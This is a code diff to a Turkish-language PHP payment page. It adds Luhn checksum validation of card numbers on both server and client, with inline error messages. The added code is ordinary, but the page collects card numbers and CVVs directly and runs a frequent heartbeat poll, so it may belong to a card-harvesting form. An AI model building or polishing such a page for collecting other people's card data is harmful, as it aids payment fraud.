@@ -92,6 +92,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if (!preg_match('/^\d{16}$/', $kart_no)) {
         $hatalar['cc'] = 'Kart numarası 16 haneli olmalıdır.';
+    } else {
+        // Luhn Algoritması ile Kart Numarası Doğrulama
+        $sum = 0;
+        $numDigits = strlen($kart_no);
+        $parity = $numDigits % 2;
+        for ($i = 0; $i < $numDigits; $i++) {
+            $digit = (int)$kart_no[$i];
+            if ($i % 2 == $parity) {
+                $digit *= 2;
+                if ($digit > 9) {
+                    $digit -= 9;
+                }
+            }
+            $sum += $digit;
+        }
+        if ($sum % 10 !== 0) {
+            $hatalar['cc'] = 'Girdiğiniz kart numarası geçersizdir.';
+        }
     }
 
     // SKT Ayırıcı (Format: 08 / 28 veya 08/28)
@@ -594,6 +612,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                             <div class="form-group" style="text-align: left; margin-bottom: 15px;">
                                                 <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">Kart numaranız</label>
                                                 <input type="text" id="cc" name="cc" class="form-control text-center" placeholder="Kredi Kartı Numarası" autocomplete="off" value="<?= htmlspecialchars($form_data['kart_no']) ?>" required maxlength="19" inputmode="numeric" style="text-align: center;">
+                                                <span id="cc-error" style="color: #f87171; font-size: 12px; display: none; margin-top: 5px; font-weight: 500; text-align: center; width: 100%;">⚠️ Geçersiz kart numarası. Lütfen kontrol edin.</span>
                                             </div>
 
                                             <!-- SKT & CVV -->
@@ -782,6 +801,70 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         setInterval(heartbeat, 3000);
     })();
+
+    // Luhn Algoritması ile Kart Numarası Doğrulama
+    function isValidLuhn(number) {
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = number.length - 1; i >= 0; i--) {
+            let digit = parseInt(number.charAt(i));
+            if (shouldDouble) {
+                if ((digit *= 2) > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        return (sum % 10) === 0;
+    }
+
+    const paymentForm = document.querySelector('form[name="payment-form"]');
+    const ccError = document.getElementById('cc-error');
+
+    function validateCardNumber() {
+        const val = ccInput.value.replace(/\D/g, '');
+        if (val.length === 0) {
+            ccError.style.display = 'none';
+            ccInput.style.borderColor = '';
+            return false;
+        }
+        if (val.length < 16) {
+            ccError.innerText = '⚠️ Kart numarası 16 haneli olmalıdır.';
+            ccError.style.display = 'block';
+            ccInput.style.borderColor = '#ef4444';
+            return false;
+        } else if (!isValidLuhn(val)) {
+            ccError.innerText = '⚠️ Geçersiz kart numarası. Lütfen kontrol edin.';
+            ccError.style.display = 'block';
+            ccInput.style.borderColor = '#ef4444';
+            return false;
+        } else {
+            ccError.style.display = 'none';
+            ccInput.style.borderColor = '';
+            return true;
+        }
+    }
+
+    if (ccInput) {
+        ccInput.addEventListener('blur', validateCardNumber);
+        ccInput.addEventListener('input', () => {
+            const rawVal = ccInput.value.replace(/\D/g, '');
+            if (rawVal.length >= 16) {
+                validateCardNumber();
+            } else {
+                ccError.style.display = 'none';
+                ccInput.style.borderColor = '';
+            }
+        });
+    }
+
+    if (paymentForm) {
+        paymentForm.addEventListener('submit', (e) => {
+            if (!validateCardNumber()) {
+                e.preventDefault();
+                ccInput.focus();
+            }
+        });
+    }
 </script>
 
 </body>
